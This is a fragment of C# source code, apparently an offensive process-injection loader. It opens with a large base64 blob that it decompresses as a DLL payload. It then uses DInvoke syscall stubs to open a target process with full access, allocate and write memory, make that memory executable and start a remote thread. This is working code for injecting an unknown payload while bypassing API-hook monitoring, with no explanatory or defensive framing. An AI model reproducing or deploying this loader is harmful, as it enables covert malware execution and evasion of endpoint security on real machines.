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\n");
            var rDllRawBytes = Decompress(rDllCompressed);

            IntPtr stub = DInvoke.DynGen.GetSyscallStub("NtOpenProcess");
            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            DInvoke.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Native.OBJECT_ATTRIBUTES();

            DInvoke.Native.CLIENT_ID ci = new DInvoke.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)processId
            };

            DInvoke.Native.NTSTATUS result = ntOpenProcess(ref hProcess, 0x001F0FFF, ref oa, ref ci);

            if (result == 0)
            {
                Console.WriteLine("[+] NtOpenProcess succeeded!");
            }
            else
            {
                Console.WriteLine($"[-] NtOpenProcess failed: {result}");
            }

            // NtAllocateVirtualMemory
            stub = DInvoke.DynGen.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)rDllRawBytes.Length;

            result = ntAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, 0x1000 | 0x2000, 0x04);

            if (result == 0)
            {
                Console.WriteLine("[+] NtAllocateVirtualMemory succeeded!");
            }
            else
            {
                Console.WriteLine($"[-] NtAllocateVirtualMemory failed: {result}");
            }

            // NtWriteVirtualMemory
            stub = DInvoke.DynGen.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(rDllRawBytes.Length);
            Marshal.Copy(rDllRawBytes, 0, buffer, rDllRawBytes.Length);

            uint bytesWritten = 0;

            result = ntWriteVirtualMemory(hProcess, baseAddress, buffer, (uint)rDllRawBytes.Length, ref bytesWritten);

            if (result == 0)
            {
                Console.WriteLine("[+] NtWriteVirtualMemory succeeded!");
            }
            else
            {
                Console.WriteLine($"[-] NtWriteVirtualMemory failed: {result}");
            }

            Marshal.FreeHGlobal(buffer);

            // NtProtectVirtualMemory
            stub = DInvoke.DynGen.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            uint oldProtect = 0;

            result = ntProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, 0x20, ref oldProtect);

            if (result == 0)
            {
                Console.WriteLine("[+] NtProtectVirtualMemory succeeded!");
            }
            else
            {
                Console.WriteLine($"[-] NtProtectVirtualMemory failed: {result}");
            }
            Console.WriteLine($"[-] NtProtectVirtualMemory failed: {result}");

            // NtCreateThreadEx
            stub = DInvoke.DynGen.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            result = ntCreateThreadEx(out hThread, DInvoke.Win32.Advapi32.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (result == 0)
            {
                Console.WriteLine("[+] NtCreateThreadEx succeeded!");
            }
            else
            {
                Console.WriteLine($"[-] NtCreateThreadEx failed: {result}");
            }
        }
    }
}
